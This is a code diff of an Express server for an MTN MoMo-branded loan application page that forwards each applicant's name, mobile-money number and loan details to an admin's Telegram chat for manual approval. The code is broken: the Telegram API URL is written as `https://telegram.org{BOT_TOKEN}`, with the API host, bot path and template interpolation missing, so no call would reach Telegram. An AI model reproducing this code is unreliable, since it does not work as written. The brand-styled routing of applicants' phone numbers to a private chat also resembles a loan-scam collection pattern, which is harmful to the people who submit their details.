@@ -1,99 +1,106 @@
 const express = require('express');
-const cors = require('cors');
 const path = require('path');
 const axios = require('axios');
+require('dotenv').config();
 
 const app = express();
-const PORT = process.env.PORT || 3000;
-
-app.use(cors());
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
-// Telegram Bot API Credentials (get token from @BotFather on Telegram)
-const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || 'YOUR_TELEGRAM_BOT_TOKEN';
-const DEFAULT_ADMIN_CHAT_ID = process.env.TELEGRAM_CHAT_ID || 'YOUR_DEFAULT_CHAT_ID';
+const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+const ADMIN_CHAT_ID = process.env.TELEGRAM_ADMIN_CHAT_ID;
+const TELEGRAM_API = `https://telegram.org{BOT_TOKEN}`;
 
-/**
- * POST /api/loans/apply
- * Evaluates loan application and dispatches approval feedback via Telegram
- */
+const loans = {};
+let lastUpdateId = 0;
+
+// 1. Receive Application from public/index.html -> Send to Telegram
 app.post('/api/loans/apply', async (req, res) => {
-  const {
-    fullName,
-    mtnMomoNumber,
-    telegramPhone,
-    telegramChatId,
-    loanAmount,
-    repaymentMonths,
-    monthlyInstallment,
-    totalRepayable
-  } = req.body;
+    const { fullName, mtnNumber, loanService, loanAmount, repaymentPeriod } = req.body;
+    const id = 'LOAN-' + Math.floor(100000 + Math.random() * 900000);
 
-  // Validate required fields and 10-digit numbers
-  if (!fullName || !/^\d{10}$/.test(mtnMomoNumber) || !/^\d{10}$/.test(telegramPhone)) {
-    return res.status(400).json({
-      status: 'ERROR',
-      message: 'Please provide your Full Name and complete 10-digit numbers for both MTN MoMo and Telegram.'
-    });
-  }
+    loans[id] = { id, fullName, mtnNumber, loanService, loanAmount, repaymentPeriod, status: 'PENDING' };
 
-  // Demo Approval Rule: Approves loans up to 500,000
-  const numericAmount = Number(loanAmount);
-  const isApproved = numericAmount > 0 && numericAmount <= 500000;
-  const referenceId = `MOMO-TG-${Date.now().toString().slice(-6)}`;
+    const message = [
+        '🔔 *NEW MTN MOMO LOAN REQUEST*',
+        `🆔 *ID:* \`${id}\``,
+        `👤 *Name:* ${fullName}`,
+        `📱 *MTN Number:* ${mtnNumber}`,
+        `💼 *Service:* ${loanService}`,
+        `💰 *Amount:* ${loanAmount}`,
+        `📅 *Period:* ${repaymentPeriod}`
+    ].join('\n');
 
-  const telegramMessage = isApproved
-    ? `✅ *MTN MoMo Easy Loan APPROVED*\n\nY'ello *${fullName}*!\n• *MoMo Account:* ${mtnMomoNumber}\n• *Telegram Phone:* ${telegramPhone}\n• *Approved Amount:* ${numericAmount.toLocaleString()}\n• *Tenure:* ${repaymentMonths} Month(s)\n• *Monthly Installment:* ${Number(monthlyInstallment).toLocaleString()}\n• *Total Repayable:* ${Number(totalRepayable).toLocaleString()}\n• *Reference ID:* \`${referenceId}\``
-    : `❌ *MTN MoMo Easy Loan DECLINED*\n\nY'ello *${fullName}*, your loan request of *${numericAmount.toLocaleString()}* exceeds the instant demo limit of 500,000.\n• *Reference ID:* \`${referenceId}\``;
-
-  // Use numeric Chat ID if entered, otherwise fall back to DEFAULT_ADMIN_CHAT_ID
-  const recipientChatId = (telegramChatId && /^-?\d+$/.test(telegramChatId))
-    ? telegramChatId
-    : DEFAULT_ADMIN_CHAT_ID;
-
-  let telegramDispatched = false;
-
-  if (TELEGRAM_BOT_TOKEN !== 'YOUR_TELEGRAM_BOT_TOKEN' && recipientChatId !== 'YOUR_DEFAULT_CHAT_ID') {
     try {
-      await axios.post(`https://telegram.org{TELEGRAM_BOT_TOKEN}/sendMessage`, {
-        chat_id: recipientChatId,
-        text: telegramMessage,
-        parse_mode: 'Markdown'
-      });
-      telegramDispatched = true;
+        await axios.post(`${TELEGRAM_API}/sendMessage`, {
+            chat_id: ADMIN_CHAT_ID,
+            text: message,
+            parse_mode: 'Markdown',
+            reply_markup: {
+                inline_keyboard: [[
+                    { text: '✅ Approve Loan', callback_data: `APPROVE:${id}` },
+                    { text: '❌ Decline', callback_data: `REJECT:${id}` }
+                ]]
+            }
+        });
+
+        res.json({ applicationId: id, status: 'PENDING' });
     } catch (error) {
-      console.error('Telegram API Error:', error.response?.data || error.message);
+        console.error('Telegram API Error:', error.response?.data || error.message);
+        res.status(500).json({ message: 'Failed to notify admin on Telegram.' });
     }
-  } else {
-    // Offline Demo Mode: Prints the exact Telegram message in your terminal
-    console.log('\n=================================================');
-    console.log(`[TELEGRAM BOT API DISPATCH -> Phone: ${telegramPhone} | Chat: ${telegramChatId || 'Default'}]`);
-    console.log(telegramMessage.replace(/\*/g, ''));
-    console.log('=================================================\n');
-    telegramDispatched = true;
-  }
-
-  // 3-second delay so the approval spinner displays cleanly during your demo
-  setTimeout(() => {
-    res.json({
-      status: isApproved ? 'APPROVED' : 'DECLINED',
-      referenceId,
-      mtnMomoNumber,
-      telegramDispatched,
-      message: isApproved
-        ? `Y'ello ${fullName}! Your loan of ${numericAmount.toLocaleString()} is APPROVED for MoMo number ${mtnMomoNumber}. Feedback sent to Telegram.`
-        : `Y'ello ${fullName}, your loan of ${numericAmount.toLocaleString()} was DECLINED (exceeds 500,000 demo limit).`
-    });
-  }, 3000);
 });
 
-// Serve index.html on all other routes
-app.get('*', (req, res) => {
-  res.sendFile(path.join(__dirname, 'public', 'index.html'));
+// 2. Frontend Polls This Endpoint While Waiting for Approval
+app.get('/api/loans/status/:id', (req, res) => {
+    const record = loans[req.params.id];
+    if (!record) return res.status(404).json({ status: 'NOT_FOUND' });
+    res.json({ status: record.status });
 });
 
+// 3. Background Listener for Admin Button Taps in Telegram
+async function pollTelegramUpdates() {
+    if (!BOT_TOKEN) return;
+    try {
+        const res = await axios.get(`${TELEGRAM_API}/getUpdates`, {
+            params: { offset: lastUpdateId + 1, timeout: 25 }
+        });
+
+        for (const update of res.data.result) {
+            lastUpdateId = update.update_id;
+
+            if (update.callback_query) {
+                const cb = update.callback_query;
+                const [decision, id] = cb.data.split(':');
+
+                if (loans[id]) {
+                    loans[id].status = decision === 'APPROVE' ? 'APPROVED' : 'REJECTED';
+                }
+
+                await axios.post(`${TELEGRAM_API}/answerCallbackQuery`, {
+                    callback_query_id: cb.id,
+                    text: decision === 'APPROVE' ? 'Loan Approved!' : 'Loan Declined!'
+                });
+
+                await axios.post(`${TELEGRAM_API}/editMessageText`, {
+                    chat_id: cb.message.chat.id,
+                    message_id: cb.message.message_id,
+                    text: `${cb.message.text}\n\n*Admin Decision:* ${decision === 'APPROVE' ? '✅ APPROVED' : '❌ DECLINED'}`,
+                    parse_mode: 'Markdown'
+                });
+            }
+        }
+    } catch (err) {
+        // Ignore timeout/network hiccups and retry
+    } finally {
+        setTimeout(pollTelegramUpdates, 1000);
+    }
+}
+
+const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
-  console.log(`MTN MoMo Navy & Telegram Demo running at http://localhost:${PORT}`);
+    console.log(`Server running at http://localhost:${PORT}`);
+    pollTelegramUpdates();
 });
+
 
